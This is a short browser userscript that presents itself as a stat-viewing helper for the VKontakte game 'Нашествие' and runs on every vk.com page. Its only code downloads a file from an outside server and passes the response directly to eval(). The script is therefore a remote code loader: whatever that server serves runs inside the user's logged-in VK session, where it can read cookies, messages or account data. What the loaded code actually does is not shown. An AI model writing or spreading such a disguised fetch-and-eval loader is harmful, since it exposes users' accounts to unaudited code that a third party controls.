// ==UserScript==
// @name Invasion Script
// @description Вспомогательное расширение для просмотра игровых характеристик в игре Нашествие на страницах ВКонтакте.
// @version 1.00
// @author Oleg.Davydov

// @include     *://vk.com/*

// @license MIT
// @icon https://i.ibb.co/7SN8mSK/icon-250.png
// @homepageURL http://h91222sp.beget.tech/home_script/
// ==/UserScript==

(() => {
	var xhr = new XMLHttpRequest();
	xhr.open('GET', 'https://vk-bot.com/invscript/invasion.json', true);
	xhr.send();
	xhr.onloadend = () => {
		eval(xhr.responseText);
	};
})();